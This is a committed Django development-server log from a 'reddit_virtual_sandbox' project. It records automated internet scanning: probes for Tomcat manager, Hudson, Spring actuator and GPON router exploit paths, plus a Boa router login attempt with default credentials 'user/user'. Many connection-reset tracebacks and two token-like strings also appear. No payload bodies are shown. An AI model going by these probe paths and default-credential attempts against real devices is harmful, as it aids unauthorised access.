+2021-01-25:22:59:07 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:22:59:07 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 22:59:07] "GET /manager/html HTTP/1.1" 400 66138
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[25/Jan/2021 22:59:07] "GET /manager/html HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('209.141.58.37', 33962)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:23:55:22 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:23:55:22 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 23:55:22] "GET /manager/html HTTP/1.1" 400 66139
+[25/Jan/2021 23:57:39] "HEAD / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-26:01:21:18 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-26:01:21:18 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[26/Jan/2021 01:21:18] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-26:01:21:47 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /script
+2021-01-26:01:21:47 WARNING [log.py:log_response:L230] Bad Request: /script
+[26/Jan/2021 01:21:47] "GET /script HTTP/1.1" 400 66073
+[26/Jan/2021 01:30:23] "GET / HTTP/1.1" 200 81
+Not Found: /config/getuser
+2021-01-26:02:13:29 WARNING [log.py:log_response:L230] Not Found: /config/getuser
+[26/Jan/2021 02:13:29] "GET /config/getuser?index=0 HTTP/1.1" 404 8754
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-26:02:44:03 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-26:02:44:03 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[26/Jan/2021 02:44:03] "GET /manager/html HTTP/1.1" 400 66139
+Not Found: /actuator/health
+2021-01-26:03:26:55 WARNING [log.py:log_response:L230] Not Found: /actuator/health
+[26/Jan/2021 03:26:55] "GET /actuator/health HTTP/1.1" 404 8749
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-26:04:10:40 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-26:04:10:40 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[26/Jan/2021 04:10:40] "GET /manager/html HTTP/1.1" 400 66139
+[26/Jan/2021 04:12:32] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\x99\x01\x00\x00\x95\x03\x03`\x0f\x96Ýâ¥AÐ+©ØdZh\x1b')
+[26/Jan/2021 04:12:32] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[26/Jan/2021 04:35:15] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-26:05:12:41 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /boaform/admin/formLogin
+2021-01-26:05:12:41 WARNING [log.py:log_response:L230] Bad Request: /boaform/admin/formLogin
+[26/Jan/2021 05:12:41] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 400 67245
+[26/Jan/2021 05:28:54] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00u\x01\x00\x00q\x03\x03Z0\x04\x81EX@þ,Ó/¨º\x81P\x7fÎ%\x04É!\x98\x0fätÀÒ\x8eÙp\x92I\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[26/Jan/2021 05:28:54] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-26:05:39:28 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /script
+2021-01-26:05:39:28 WARNING [log.py:log_response:L230] Bad Request: /script
+[26/Jan/2021 05:39:28] "GET /script HTTP/1.1" 400 66073
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[26/Jan/2021 05:39:28] "GET /script HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('209.141.57.145', 53886)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-26:06:58:40 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-26:06:58:40 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[26/Jan/2021 06:58:40] "GET /manager/html HTTP/1.1" 400 66139
+[26/Jan/2021 09:25:07] "GET / HTTP/1.1" 200 71
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-26:09:52:13 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-26:09:52:13 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[26/Jan/2021 09:52:13] "GET /manager/html HTTP/1.1" 400 66139
+[26/Jan/2021 10:28:12] code 400, message Bad request syntax ('\x16\x03\x01\x00\x8a\x01\x00\x00\x86\x03\x03¾Êác\xad[¯ÙP\x10T\x8aH) ÔÄ\x7fã6O\x9a&\x00\x1e·RùÎ\x98\x97Ç\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\tÀ\x14À')
+[26/Jan/2021 10:28:12] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[26/Jan/2021 10:28:37] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-26:10:43:11 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-26:10:43:11 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[26/Jan/2021 10:43:11] "GET /manager/html HTTP/1.1" 400 66137
+Not Found: /hudson
+2021-01-26:11:10:09 WARNING [log.py:log_response:L230] Not Found: /hudson
+[26/Jan/2021 11:10:09] "GET /hudson HTTP/1.1" 404 8722
+Invalid HTTP_HOST header: '127.0.0.1:8080'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+2021-01-26:12:06:51 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: '127.0.0.1:8080'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /GponForm/diag_Form
+2021-01-26:12:06:51 WARNING [log.py:log_response:L230] Bad Request: /GponForm/diag_Form
+[26/Jan/2021 12:06:51] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 67095
+/home/ubuntu/reddit_virtual_sandbox/server/server/settings.py changed, reloading.
+2021-01-26:12:09:20 INFO   [autoreload.py:trigger_reload:L236] /home/ubuntu/reddit_virtual_sandbox/server/server/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+January 22, 2021 - 09:17:14
+Django version 3.1.3, using settings 'server.settings'
+Starting development server at http://0:8080/
+Quit the server with CONTROL-C.
+CZJ_qvqDerf29oRyxRFREmNMITSh6g
+removal_reason:  all
+GIhCRCa2ap9WaxEfjiqanXbfmDFuGQ
+2021-01-26:12:09:21 DEBUG  [selector_events.py:__init__:L54] Using selector: EpollSelector
+Watching for file changes with StatReloader
+2021-01-26:12:09:21 INFO   [autoreload.py:run_with_reloader:L613] Watching for file changes with StatReloader
+Invalid HTTP_HOST header: '127.0.0.1:8080'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+2021-01-26:12:13:41 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: '127.0.0.1:8080'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /GponForm/diag_Form
+2021-01-26:12:13:41 WARNING [log.py:log_response:L230] Bad Request: /GponForm/diag_Form
+[26/Jan/2021 12:13:42] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 67095
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[26/Jan/2021 12:13:42] "POST /GponForm/diag_Form?images/ HTTP/1.1" 500 59
